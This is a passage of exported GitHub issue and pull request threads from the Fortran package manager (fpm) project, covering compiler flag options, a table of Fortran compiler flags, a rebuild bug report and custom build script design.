                    "text": "Hi @urbanjost, please can you see #229 for my refactoring of the run and test commands which fixes the problem you mentioned. In summary, #229 uses information from the model%targets structure to find executable paths instead of reconstructing the paths in the run command subroutine."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-10 13:54:45+00:00",
                    "text": "Many thanks for the feedback and reviews everyone, I will now merge."
                }
            ]
        },
        {
            "number": 224,
            "user": "awvwgk",
            "date": "2020-11-01 10:46:39+00:00",
            "title": "Create a reference for the package manifest",
            "text": "This PR creates a reference of the current specification of the package manifest for fpm, using the bootstrap fpm, Fortran fpm and the fpm-registry to collect all supported entries and sections. This allows to define specs independently from the actual implementation in the bootstrap or Fortran version or the additional constraints imposed by the fpm-registry.\nThis augments the PACKAGING.md, which is more a user guide to packaging with fpm.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:24:13+00:00",
                    "text": "This is definitely something we needed. Thanks for putting it together."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:04:59+00:00",
                    "text": "Thanks for reviewing everyone and many thanks @awvwgk. With three approvals I will now merge."
                }
            ]
        },
        {
            "number": 223,
            "user": "awvwgk",
            "date": "2020-10-31 11:13:52+00:00",
            "title": "Compiler support and recognition",
            "text": "Came up in #220.\nAt some point we might have to determine which compiler is used with fpm, therefore I tried to collect some information on the various Fortran compilers around. I only have first hand access to a fraction of them, so most of these information are second hand from HPC documentations or build systems.\nFeel free to correct or add information to this table. Alternatively, we could move this table to the wiki.\n\n\n\nvendor\nFortran compiler\nC compiler\nModule output directory\nModule include directory\nOpenMP\nFree for OSS\n\n\n\n\nGnu\ngfortran\ngcc\n-J\n-I\n-fopenmp\n\u2714\ufe0f\n\n\nIntel\nifort\nicc\n-module\n-I\n-qopenmp\n\u2714\ufe0f\n\n\nIntel (Windows)\nifort\nicc\n/module:path\n/I\n/Qopenmp\n\u2714\ufe0f\n\n\nIntel oneAPI\nifx\nicx\n-module\n-I\n-qopenmp\n\u2714\ufe0f\n\n\nPGI\npgfortran\npgcc\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nNVIDIA\nnvfortran\nnvc\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nLLVM flang\nflang\nclang\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nLFortran\nlfortran\n---\n?\n?\n?\n\u2714\ufe0f\n\n\nLahey/Futjitsu\nlfc\n?\n-M\n-I\n-openmp\n?\n\n\nNAG\nnagfor\n?\n-mdir\n-I\n-openmp\n\u274c\n\n\nCray\ncrayftn\ncraycc\n-J\n-I\n-homp\n?\n\n\nIBM\nxlf90\n?\n-qmoddir\n-I\n-qsmp\n\u2714\ufe0f\n\n\nOracle/Sun\n?\n?\n-moddir=\n-M\n-xopenmp\n?\n\n\nSilverfrost FTN95\nftn95\n?\n?\n/MOD_PATH\n?\n?\n\n\nElbrus\n?\nlcc\n-J\n-I\n-fopenmp\n?\n\n\nHewlett Packard\n?\n?\n?\n?\n?\ndiscontinued\n\n\nWatcom\n?\n?\n?\n?\n?\ndiscontinued\n\n\nPathScale\n?\n?\n-module\n-I\n-mp\ndiscontinued\n\n\nG95\n?\n?\n-fmod=\n-I\n-fopenmp\ndiscontinued\n\n\nOpen64\n?\n?\n-module\n-I\n-mp\ndiscontinued\n\n\nUnisys\n?\n?\n?\n?\n?\ndiscontinued\n\n\n\nFor now it might be sufficient to only support GCC, since we only guarantee that fpm works when compiled with GCC right now.\nFirst class compiler support requires access to the compiler to allow testing in a CI environment, some of the commercial compilers have free versions for open source developers available.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:22:33+00:00",
                    "text": "Overview of compilers known by the meson build system can be found here, actual implementation is here."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-31 11:34:25+00:00",
                    "text": "Awesome, thanks @awvwgk this is super useful! I've edited to include Intel differences on Windows."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:27:06+00:00",
                    "text": "Thanks for putting this together. It will be invaluable as we try to support more compilers."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-06 20:29:24+00:00",
                    "text": "I have asked NAG to have free access for use in maintaining NAG support for Meson build system, but never got a reply. I did get replies to other email topics with NAG.\nIntel (non-oneAPI) is also free for OSS on Windows\nIBM XL is generally available at no cost assuming you have an IBM Power system to run it on."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 11:15:20+00:00",
                    "text": "I found that Ubuntu Focal (ubuntu-20.04 image) has a flang package available."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-22 19:19:53+00:00",
                    "text": "This Ubuntu flang possibly came from Debian. It might be quite out of date i.e. syntax bugs that might make issues for modern Fortran packages."
                }
            ]
        },
        {
            "number": 222,
            "user": "LKedward",
            "date": "2020-10-30 16:03:15+00:00",
            "title": "Rebuild not working properly after #213",
            "text": "Since 4443986 (#213), changes to library sources do not trigger a rebuild of apps and tests.\n\nTo reproduce and demonstrate:\ncd /tmp/\ngit clone git@github.com:fortran-lang/fpm.git\ncd fpm/\ncd bootstrap/\nstack install\ncd ../example_packages/hello_complex\nfpm run\necho \"!\" >> source/greet_m.f90 \nfpm run\n\nThe last fpm run command will rebuild the library, but not the apps or tests.\nOutput\n\n~$ cd /tmp/\n/tmp$ git clone git@github.com:fortran-lang/fpm.git\nCloning into 'fpm'...\nremote: Enumerating objects: 206, done.\nremote: Counting objects: 100% (206/206), done.\nremote: Compressing objects: 100% (101/101), done.\nremote: Total 2830 (delta 114), reused 178 (delta 100), pack-reused 2624\nReceiving objects: 100% (2830/2830), 568.50 KiB | 1.49 MiB/s, done.\nResolving deltas: 100% (1569/1569), done.\n/tmp$ cd fpm/\n/tmp/fpm$ cd bootstrap/\n/tmp/fpm/bootstrap$ stack install\nDEPRECATED: The package at Repo from https://gitlab.com/everythingfunctional/hedge.git, commit 1c6cba3b5f8e52cf317f2421aaca13a0ddab4e92 in subdir . does not include a cabal file.\nInstead, it includes an hpack package.yaml file for generating a cabal file.\nThis usage is deprecated; please see https://github.com/commercialhaskell/stack/issues/5210.\nSupport for this workflow will be removed in the future.\n\nBuilding all executables for `fpm' once. After a successful build of all of them, only specified executables will be rebuilt.\nfpm> configure (lib + exe)\nConfiguring fpm-0.1.0.0...\nWarning: 'extra-source-files: ../README.md' is a relative path outside of the\nsource tree. This will not work when generating a tarball with 'sdist'.\nWarning: 'extra-source-files: ../ChangeLog.md' is a relative path outside of\nthe source tree. This will not work when generating a tarball with 'sdist'.\nfpm> build (lib + exe)\nPreprocessing library for fpm-0.1.0.0..\nBuilding library for fpm-0.1.0.0..\n[1 of 4] Compiling BuildModel\n[2 of 4] Compiling Build\n[3 of 4] Compiling Fpm\n[4 of 4] Compiling Paths_fpm\nPreprocessing executable 'fpm' for fpm-0.1.0.0..\nBuilding executable 'fpm' for fpm-0.1.0.0..\n[1 of 2] Compiling Main\n[2 of 2] Compiling Paths_fpm\nLinking .stack-work/dist/x86_64-linux/Cabal-2.4.0.1/build/fpm/fpm ...\nfpm> copy/register\nInstalling library in /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/lib/x86_64-linux-ghc-8.6.5/fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh\nInstalling executable fpm in /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/bin\nRegistering library for fpm-0.1.0.0..\nCopying from /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/bin/fpm to /home/lk12325/.local/bin/fpm\n\nCopied executables to /home/lk12325/.local/bin:\n- fpm\n\n\n/tmp/fpm$ cd ../example_packages/hello_complex\n/tmp/fpm/example_packages/hello_complex$ fpm run\n# gfortran (for build/gfortran_debug/hello_complex/source_subdir_constants.f90.o build/gfortran_debug/hello_complex/subdir_constants.mod)\n# gfortran (for build/gfortran_debug/hello_complex/source_farewell_m.f90.o build/gfortran_debug/hello_complex/farewell_m.mod)\n# gfortran (for build/gfortran_debug/hello_complex/source_greet_m.f90.o build/gfortran_debug/hello_complex/greet_m.mod)\n# ar (for build/gfortran_debug/hello_complex/libhello_complex.a)\nar: creating build/gfortran_debug/hello_complex/libhello_complex.a\n# gfortran (for build/gfortran_debug/apps/say_hello/apps_say_hello_say_Hello.f90.o)\n# gfortran (for build/gfortran_debug/apps/say_hello/say_Hello)\n# gfortran (for build/gfortran_debug/apps/say_goodbye/apps_say_goodbye_say_goodbye.f90.o)\n# gfortran (for build/gfortran_debug/apps/say_goodbye/say_goodbye)\n# gfortran (for build/gfortran_debug/tests/greet/tests_greet_greet_test.f90.o)\n# gfortran (for build/gfortran_debug/tests/greet/greet_test)\n# gfortran (for build/gfortran_debug/tests/farewell/tests_farewell_farewell_test.f90.o)\n# gfortran (for build/gfortran_debug/tests/farewell/farewell_test)\n Hello, World!\n Goodbye, World!\n/tmp/fpm/example_packages/hello_complex$ echo \"!\" >> source/greet_m.f90 \n/tmp/fpm/example_packages/hello_complex$ fpm run\n# gfortran (for build/gfortran_debug/hello_complex/source_greet_m.f90.o build/gfortran_debug/hello_complex/greet_m.mod)\n Hello, World!\n Goodbye, World!",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-01 15:08:27+00:00",
                    "text": "@everythingfunctional, are you able to look into this?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 15:30:48+00:00",
                    "text": "I'm pretty sure I know exactly what happened. Forgot a need archives in the build rules. I'm super busy today, but I should have time tomorrow to fix it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-03 22:57:11+00:00",
                    "text": "Also note, the build system is comparing file hashes for rebuilds, so adding a comment to the end of the file won't cause the .o or .mod files to be different, stopping the rebuild after that one step."
                }
            ]
        },
        {
            "number": 221,
            "user": "everythingfunctional",
            "date": "2020-10-28 19:50:37+00:00",
            "title": "Test and executable runner options",
            "text": "Allow a way of specifying a command to be used to run the executable(s) or test(s).\nAn example of where this might be particularly useful (practically necessary) is\nfpm test --runner \"valgrind --leak-check=full --error-exitcode=1\"\n\nto run the tests while looking for memory leaks.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 19:51:48+00:00",
                    "text": "Note, this should be merged after #220"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 21:43:25+00:00",
                    "text": "While #220 makes it effectively impossible to know the path to the produced executable (which is something we were trying to avoid specifying anyway), this, combined with the -- ARGS functionality should remove most users' needs to know it anyway. Whatever command a user would like to run with the executable is now constructable via fpm as [optional runner ]path/to/executable[ optional args] constructed via fpm run [--runner \"optional runner\"] --target executable [-- optional args]"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-30 19:44:24+00:00",
                    "text": "As mentioned the  --flag option does not allow multiple compiler options. A small errata is to change addional ==> additional in the help text. Wondering if for a cross-mounted installation if the UUID for the directory should include some kind of system identifier as well; so that if I compile on a big-endian and small-endian machine from the same directory, for example, that I get two different output directories. Did not look carefully at how the key is generated, but right now using the same flags in a different order generates a different output file  (ie.  fpm run A --flag -Wextra --flag -Wall uses a different output file than fpm run A --flag -Wall --flag Wextra).  So one reason not to allow multiple arguments with a single --flag switch might be to more easily identify the flags are the same.  One big difference still remaining between the Fortran and bootstrap version is that fpm new A with no explicit switches defaults to no directories for the bootstrap version and being equivalent to fpm new --lib --app --test in the Fortran version.  Good with it as an Alpha feature for people to experiment with; but not being able to specify more than one flag at a time becomes very verbose when trying to duplicate the switches used by --release, for example.  Assuming the unique key based on options (a clever idea) is not reversible it is somewhat hard after you have generated a bunch of binaries to remember which is which  (A profiling version, a version with coarray set to one processor and set to multiple processors, ...) so maybe some kind of labeling mechanism or recording of the options used would seem useful. So good with both #220 and #221 as alpha versions but hoping something emerges to resolve those questions as people try  it.  A footnote is that to add a similiar option to the Fortran version would either take a restriction that a flag value has to start with a space if the first character would otherwise be a dash or a slight change to the CLI interface would be needed but would be relatively straight-forward.  So unless requiring --flag \" -option value -option value(s) ...\" is too unintuitive\nthat would be non-trivial to add.  Adding something like --flag 'NAME: -opt [value] -opt[value]' would let you provide a tag for the options and prevent the problem with non-numeric values starting with a dash, however.\nPS:  For testing I found the intrinsics for echoing the compiler version and options useful. Last I checked a lot of compilers still did not implement that; but maybe each build directory could have a little program built into it that called those functions and maybe even uname -a and date information (although doing that portably right now is an issue).  Just for reference I like the output to be a little more readable from gfortran so I used to following for some of the testing; albeit I admit to a bit of overkill just to parse on spaces:\nprogram demo_compiler_version\nuse, intrinsic :: iso_fortran_env, only : compiler_version, compiler_options\nimplicit none\ncharacter(len=:),allocatable :: args(:)\ncharacter(len=4096)          :: line\ninteger                      :: i\nwrite(line,'(a)')compiler_options()\n   write (*,'(a)')repeat('=',80)\n   print '(a)', &\n    'This file was compiled by ', &\n    compiler_version(),           &\n    'using the options'\n   call split(line,args)\n   write(*,'(a)')(trim(args(i)),i=1,size(args))\n   write (*,'(a)')repeat('=',80)\ncontains\nsubroutine split(input_line,array)\ncharacter(len=*),intent(in)              :: input_line\ncharacter(len=:),allocatable,intent(out) :: array(:)\ninteger,allocatable         :: ibegin(:), iterm(:)\ncharacter(len=*),parameter  :: dlim=' '//char(9)//char(10)//char(11)//char(12)//char(13)//char(0)\ninteger :: n, ii, icount, ilen, i10, i20, i30, icol, idlim, ifound, inotnull, imax\n   idlim=len(dlim)\n   n=len(input_line)+1\n   allocate(ibegin(n),iterm(n))\n   ibegin(:)=1\n   iterm(:)=1\n   icount=0\n   inotnull=0\n   imax=0\n   ilen=len(input_line)\n   if(ilen.gt.0)then\n      icol=1\n      INFINITE: do i30=1,ilen,1\n         ibegin(i30)=icol\n         if(index(dlim(1:idlim),input_line(icol:icol)).eq.0)then\n            iterm(i30)=ilen\n            do i10=1,idlim\n               ifound=index(input_line(ibegin(i30):ilen),dlim(i10:i10))\n               if(ifound.gt.0) iterm(i30)=min(iterm(i30),ifound+ibegin(i30)-2)\n            enddo\n            icol=iterm(i30)+2\n            inotnull=inotnull+1\n         else\n            iterm(i30)=icol-1\n            icol=icol+1\n         endif\n         imax=max(imax,iterm(i30)-ibegin(i30)+1)\n         icount=i30\n         if(icol.gt.ilen) exit INFINITE\n      enddo INFINITE\n   endif\n   allocate(character(len=imax) :: array(inotnull))\n   ii=1\n   do i20=1,icount\n      if(iterm(i20).lt.ibegin(i20))then\n      else\n         array(ii)=input_line(ibegin(i20):iterm(i20))\n         ii=ii+1\n      endif\n   enddo\nend subroutine split\nend program demo_compiler_version"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-30 19:53:29+00:00",
                    "text": "PS:  Was not clear from --target option that \"fpm run A B C\" still worked or whether you could have multiple names on --target or specify --target more than once. Wondering if with --target you can combine it with command options instead of using -- to something like fpm run --target  'A -x 10.3 -y 20' might work.  Was wondering why the change to having an option like --target when the original just asked for a list of executable names."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-31 01:41:49+00:00",
                    "text": "I keep running into cases where using xargs(1) makes it easier as not all commands take the filenames at the end.\nSince I do not know of an equivalent command to xargs(1) on non-GNU/Unix platforms (is there one?) I am wondering if something like the mask that you can do with xargs(1) would be useful, where if the --runner command has some special string in it like %FILE that gets replaced with the filename?  This option allows for testing things that might become options like installing executables in a specified directory, listing app names when you have multiple ones, thinking about how profiling or debuggers might be incorporated, and so on. Would be useful to do on source files as well as executables. Works well in GNU/Unix \"toolbox\" environment, not sure if it works as well in MSWindows environment.\nfpm run --runner 'ls -l'\n fpm run --runner file\n fpm run --runner time\n fpm run --runner sum\n fpm run --runner 'valgrind --leak-check=full -s'\n# get list of pathnames\n fpm run --runner 'echo'\n# debugger\n fpm run --runner 'gdb'\n# combine echo and xargs\n fpm run --runner 'echo'|xargs -iXX cp XX /tmp/bin/\n# copy with name at end of command (people usually use \"cp FILE DIR/\")\n fpm run --runner 'cp --target-directory=/tmp/bin/ --update'\n# make nice little table of names that can be run or tested\n fpm test --runner echo|xargs -iXX basename XX|xargs -n 5|column -t\n# install binaries in specified directory\nfpm run --runner 'env VERSION_CONTROL=numbered install -D --owner=$LOGNAME --preserve-timestamps --backup --suffix=`date +%Y%M%D` --group=$(id -nG) --mode=0711 --target-directory=/tmp/bin/fpm --verbose --preserve-context'"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:12:08+00:00",
                    "text": "Yeah, I'm not totally enamored with the verbosity of having to specify every flag with --flag in front of it. I'm not sure exactly what the solution is yet though.\nFor recording compiler version and options, we could just put a log file at the base of the build directory that identifies them. Just printing the exact strings used to generate the hashes would probably be sufficient for most cases.\nfpm run A B C to specify multiple targets never worked, but I could definitely be persuaded to allow for multiple --target."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 19:00:23+00:00",
                    "text": "With #220 merged in, this is now ready as well. I don't think I've seen any significant objections, so I'd like to merge it sooner rather than later, but I'll give a day or two for anybody to take another look"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-16 17:56:21+00:00",
                    "text": "Having seen no objections, and indications that the Fortran version will soon have this same functionality, I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 220,
            "user": "everythingfunctional",
            "date": "2020-10-28 18:44:02+00:00",
            "title": "Compiler and flags",
            "text": "This slightly modifies the command line options of the bootstrap version to be more in line with the Fortran version, and adds options to the bootstrap version to allow specifying the compiler and flags.\nNote: There is a change to the name of the build directory. It now includes hashes that are unique to compiler version and flags used. This is in some ways a breaking change, because even our CI scripts were reliant on the name(s) we were using, even though we never promised this would be consistent or guaranteed.\nI view this partly as just an example of how this could be done that our users can play with, not necessarily exactly how it should be implemented in the Fortran version.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 20:11:13+00:00",
                    "text": "The main implications for the way the logic is currently implemented is that, if you specify anything other than the exact string \"gfortran\" as the compiler (which is the default value), then no default flags are provided. Also, if you specify any compiler flags, then only those specified are actually used (aside from ones like -c, -o, etc that are included as required for the build to work). I'm open to suggestions about if there is a better way to do this, but my feeling is that whatever is specified on the command line should override any other settings. I believe that's how most tools usually work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 20:27:48+00:00",
                    "text": "Actually, hold on merging this one for a bit. The -- args part isn't working right yet."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 21:20:25+00:00",
                    "text": "Ok, fpm test -- args --to test now works properly"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 02:20:22+00:00",
                    "text": "A vexing issue. Fortran and C compilers in many cases are primarily a \"text file to machine instructions\" converter, but usually require special flags for profiling, loading auxiliary libraries, special flags best for use with debuggers, ... but usually have little or no support for packaging and IDE types of interfaces (or fpm would not be needed).  So ideally there needs to be a way to specify compiler commands right in the TOML file so a package can use things like X11 libraries or readline or any other libraries installed on a machine.  And yet there will always be a special case where you want direct control of compiler options. Should we just supply the file names in dependency order for that case? Should we just allow you to specify a \"compiler\" name and assume that iit s a script you have set up to do the compile that just needs the filenames? Compiler switches are more standarized than at any time in the past but even the assumed parameters like -c and -o and -I and -J may not do quite what you want when automatically built.\nSo far in the h-fpm version the packager can create a custom build with a toml.mk file and the use of a few environment variables but there is nothing on the user side that is equivalent on the command line. And even with the commands put into the TOML files it is not clear if it would work to have a base compile command and supplimental keyword/option pairs like \"debugger\" and \"profile\" or whether it is just best to allow \"complete\" commands to be specified with different names. So I think we need a way to do this through the TOML file so special options can be packaged; I think some things might best be handled by just supplying the filenames in the project with a more complete \"fpm build -list\" output ;\nbut can still think of scenarios where a compiler option is needed. Not sure that should not be done by specifying a build script name like the h-fpm toml file allows with toml.mk though. But cannot think of any \"perfect\" solution so it seems like, as you said, this is a good idea to add and try.\nSo far I haven't seen anything better in any package manager I looked at that would apply to Fortran (or C/C++). My gut feeling is that we need to have something that is \"packageable\" too and this is more like a back door to let you specify on-the-fly options more than a way to \"make a distributable package\" but I have been wanting something like this almost every time I try to make an FPM package myself; at least during development. Just getting it pulled down and built now. So here I am just - but I think it sounds like something to try.trying to capture my first thoughts about alternatives before I get too involved in the nuts and bolts of how this works just to further the discussion"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 02:36:22+00:00",
                    "text": "maybe something else to think about would be a --dryrun that would just echo all the execute_system_command commands instead of doing them to let you create a script for a custom build or a switch to write a \"fpm.mk\" file are supplemental approachs?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 08:44:17+00:00",
                    "text": "I think --release and --flag should be mutually exclusive after trying it a bit. -- and --flag -value have worked, which are both tricky to implement.  Is it intended that a --flag only take one option?  Should I be able to say --flag '-g -O3 -p ....'?\n\"--release --compiler NAME\" makes sense but --release presumes certain options and using --flag seems to set options to just those specified so I was not sure what \" --release --flag OPTION\" would do;\nfpm build --release --compiler f95 --flag '-g' --flag '-O3'"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 16:26:43+00:00",
                    "text": "@urbanjost , thanks for your comments. As illustrated by #112, #191 the \"packaging\" of compiler options is rather complicated, and this effectively just sidesteps all of that to provide something people can play with for now.\nYes, --dry-run would be a useful option. I can probably get to it within the next few weeks. Not sure exactly how easy it will be yet.\nAlso, I agree that --release and --flag should be mutually exclusive, I just haven't added in the error checking logic yet. In fact, anything other than --compiler gfortran should invalidate --release also, to make the internal logic more apparent to the user."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 16:32:53+00:00",
                    "text": "@LKedward , I agree with you that hash values should probably be output in hex. I'll see if I can figure out to do that shortly.\nThat's disappointing about ifort. I was really hoping the -I and -J flags were the \"standard\" way of specifying module locations. It very much complicates the build logic. As far as specifying all the flags at once, something like this should work --flag '-Wall -Wextra ...', since multiple flags are just stuck together with strings and stuck as-is into the command."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:01:17+00:00",
                    "text": "To make the module output directory automatic fpm should be able to detect the compiler it is using. There seem to be at least five six different commands for modules (according to meson: https://github.com/mesonbuild/meson/blob/master/mesonbuild/compilers/fortran.py), with -module being the most common.\n\nIntel, PGI, Pathscale, Flang: -module\nG95: -fmod\nGnu: -J\nSun: -moddir=\nNAG: -mdir\nLahey: -M"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 17:15:48+00:00",
                    "text": "@awvwgk , eesh. I was hoping we wouldn't have to detect which compiler. It's probably better that we do, as it will allow us to always provide a default set of flags.\nAlso, those are the flags for \"where to put the produced *.mod\" files. Do you know the equivalent flags for \"where else to look for *.mod\" files?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:27:10+00:00",
                    "text": "The include directory command is of course not consistent between compiler. Fortunately, most compilers use -I with the exception of the Sun Fortran compiler, which is using -M, and the Lahey compiler, which uses --mod instead, as far as I can see."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 17:54:13+00:00",
                    "text": "Are -c and -o universal?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:59:15+00:00",
                    "text": "Looks like they are. I have access to PGI/NVIDIA, Intel, NAG and Lahey, so I could run some tests or provide some example outputs for --version if required. Fortunately, we don't have to learn everything from scratch, we should take the knowledge embedded in CMake and/or meson for the compiler handling."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 18:10:02+00:00",
                    "text": "Great. Definitely useful to try and leverage the CMake and meson examples. Hopefully that info isn't too difficult to tease out of their code base or documentation."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 18:12:51+00:00",
                    "text": "I linked the Fortran compilers meson knows about above, they are all well contained in one file and the Python code is readable enough. For CMake I'm not volunteering to search for this information."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-30 09:15:10+00:00",
                    "text": "As far as specifying all the flags at once, something like this should work --flag '-Wall -Wextra ...', since multiple flags are just stuck together with strings and stuck as-is into the command.\n\nHmm, okay it looks like fpm is passing the flag string to the shell command including quotes:\n$ fpm build --flag '-Wall -Wextra'\nCommand line: gfortran -c -Jbuild/gfortran_70f5c1d2b5b6190e_459e958fab3e1c6b/fhash '-Wall -Wextra' -o build/gfortran_70f5c1d2b5b6190e_459e958fab3e1c6b/fhash/src_fhash_fnv.f90.o src/fhash_fnv.f90\nExit code: 1\nStderr:\ngfortran: error: unrecognized command-line option \u2018-Wall -Wextra\u2019\n\n..."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:24:01+00:00",
                    "text": "@everythingfunctional I created #223 to track the available compilers and their different flavours of command line flags."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:21:23+00:00",
                    "text": "I'm not particularly enamored with it either, since you're correct that it gets quite cumbersome, but I don't know of a much better solution. I don't think we want to specify them in the fpm.toml file until we've developed some compiler agnostic way of doing it, and know exactly how they interact between packages."
                },
                {
                    "user": "ianabc",
                    "date": "2020-11-07 20:29:06+00:00",
                    "text": "This is exciting to see, passing multiple --flag options covers my use-case for now (coarrays)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 09:07:32+00:00",
                    "text": "After looking around a bit I found cargo-rustc, I like the idea of cargo to separate a build and a compile mode, maybe we should copy this approach and implement a separate command (fpm compile?), which allows this for fpm, but leave the build command deterministic by only using arguments from the package manifest (see #112)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 21:09:06+00:00",
                    "text": "@awvwgk , that's an interesting idea. However, we would need additional options to run and test to allow specifying that they run the version(s) built with such a command."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 23:45:49+00:00",
                    "text": "I've added the error check suggested regarding the mutually exclusive options, and done some refactoring to make it easier to add support for more compilers. I'll give everybody a few days to take another look, but I think with some support and approval already, this is ready to merge in."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 15:45:49+00:00",
                    "text": "However, we would need additional options to run and test to allow specifying that they run the version(s) built with such a command.\n\ncargo-rustc seems to implement run and test mode inside the rustc subcommand again to keep everything contained.\nAnother option might be to generate a lock file with the used compile flags which is also used for run and test if present, this requires to set the flags only once with build. Once the flags are changed in build the lock file will be updated as well.\nThe file could be something human-readable like TOML:\nfortran-compiler = \"gfortran\"\nfortran-compile-args = [\n  \"-O3\",\n# ...\n]\nMaybe the lock file should be placed in the build directory? One should not be able to check it in into the version control system, I think."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-11 16:27:02+00:00",
                    "text": "I think having the compile (or some other name) subcommand reimplement build, test and run allowing flags would be the most self consistent and easiest to explain. I.e.\nfpm [compile [--flag FLAG]] build|run|test ...\n\nI don't like the idea of a lock file, as it introduces implicit, global state and makes it more complicated to explain. I.e.\n...\nfpm run\n...\nfpm run\n\nWithout knowing what the ...'s are, you don't know if the two invocations of fpm run will do the same thing.\nEither way I think it's something that should be explored in a future PR."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 18:09:06+00:00",
                    "text": "Without any other significant comments that I think need addressed here, and some requests from some people funding this effort to make it available, I'm going to go ahead and merge this now."
                }
            ]
        },
        {
            "number": 219,
            "user": "LKedward",
            "date": "2020-10-28 11:09:25+00:00",
            "title": "Support custom build script",
            "text": "Match behaviour of bootstrap version",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-19 22:03:21+00:00",
                    "text": "I would prefer to restructure the build-script logic in the package manifest first, see #249, before implementing the logic in Fortran fpm."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 15:35:13+00:00",
                    "text": "I could not find any previous discussion pertaining to the bootstrap fpm design of the build-script logic. It seems to be something that @everythingfunctional built in initially to get the project off the ground?\nEdit: I found a former discussion in this issue: #118\nDo any of the libraries used to bootstrap fpm actually require a custom build script? If not, I don't see any reasons why not to restructure the build script logic in the manifest. Since fpm is still in an alpha stage, I don't think this will cause many problems for users."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-01-20 18:02:59+00:00",
                    "text": "I did indeed come up with the initial design primarily on my own. I was trying be compatible with what I believed to be common best practice in Makefiles, but we did discuss some changes that probably ought to be made. Primarily I think we concluded that all \"inputs\" to the build scripts should be through environment variables prefixed with FPM_, and any information the script would like to report back to fpm would be via stdout on lines prefixed with fpm:. This is similar to Cargo's design, and I agree it seems to be working out pretty well for them.\nI'm open to suggestions on how such scripts should be specified and executed in fpm.toml. Mine was just a first draft."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 21:14:07+00:00",
                    "text": "Thanks @everythingfunctional for the explanation. I suggest we shift to #249 to figure out a specification."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-06 00:12:42+00:00",
                    "text": "The discussion in #249 suggested we separate between one-way and two-way build scripts. This issue is for one-way build scripts.\nThe suggestion from @awvwgk was to use the following manifest syntax:\nbuild.script = [\"make\", \"-f\", \"build.mk\"]  # or just [\"build.mk\"], make extension is detected\nbuild.script = [\"sh\", \"build.sh\"]  # or just [\"build.sh\"], shell extension is detected\nbuild.script = [\"python\", \"build.py\"]  # or just [\"build.py\"], Python extension is detected\nbuild.script = [\"ruby\", \"build.rb\"] # or just [\"build.rb\"], Ruby extension is detected\nbuild.script = [\"cmake\"]  # we might detect that it is CMake and run multiple steps for this script\nThe one-way build script is expected to receive inputs via environment variables, and place the compiled libraries in the correct location.\nI think the following points from @everythingfunctional in #68 (comment) summarize what was the former Haskell implementation:\n\nThe end result of building a library in FPM is just a .a file, and all of the relevant .mod files. So, if your package specifies a build script for that, FPM will just call it. There is a small set of things that FPM would like to dictate to that script though. Those being:\n\nThe compiler to use\nThe compiler flags to use (mostly to ensure the flags are compatible with the given compiler)\nWhere to put the archive and module files\nWhere to find any of the dependencies\n\n\nRegarding point 4, I think it should be 